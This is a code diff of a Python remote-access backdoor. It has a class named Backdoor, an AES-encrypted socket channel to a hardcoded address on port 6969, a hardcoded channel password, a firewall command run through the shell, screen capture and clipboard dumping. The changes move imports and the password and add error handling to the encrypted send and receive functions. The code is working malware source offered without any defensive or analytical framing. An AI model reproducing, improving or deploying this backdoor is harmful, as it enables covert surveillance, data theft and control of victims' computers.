@@ -1,4 +1,6 @@
 #!/usr/bin/python
+from Crypto import Random
+from Crypto.Cipher import AES
 import ctypes
 import os
 import platform
@@ -10,14 +12,9 @@ import sys
 import base64
 import hashlib
 import socket
-from Crypto import Random
-from Crypto.Cipher import AES
 from mss import mss
 
-global ip,port,TMP,APPDATA,path,os_type,red,yellow,r,password
-
-# AES channel password..............
-password="djknBDS89dHFS(*HFSD())"
+global ip,port,TMP,APPDATA,path,os_type,red,yellow,r
 
 
 # color codes..................
@@ -29,8 +26,10 @@ dns = '0.0.0.0'
 ip = socket.gethostbyname(dns)
 port = 6969
 
+global password
 
-
+# AES channel password..............
+password="djknBDS89dHFS(*HFSD())"
 
 # detect OS type for future use........................
 if "Linux" in platform.uname():
@@ -59,7 +58,6 @@ try:
     subprocess.Popen(firewall_output,shell=True)
 except:
     pass
-
 
 # AES encryption/decryption.....................................................
 class AESCipher(object):
@@ -109,16 +107,23 @@ class Backdoor:
         return decrypted
 
     def json_send(self, data):
-        json_data = json.dumps(data)
-        return self.conn.send(self.encrypt(json_data))
-
+        try:
+            json_data = json.dumps(data)
+            return self.conn.send(self.encrypt(json_data))
+        except:
+            return self.conn.send(self.encrypt("[-] STDOUT parsing problem [-]"))
+            pass
 
     def receive(self):
         json_data = ""
         while True:
-            json_data = json_data + self.decrypt(self.conn.recv(4096))
-            return json.loads(json_data)
-
+            try:
+                json_data = json_data + self.conn.recv(4096)
+                return json.loads(self.decrypt(json_data))
+            except ValueError:
+                continue
+            except:
+                pass
 
     # dump clipboard..................
     def clipboard(self):
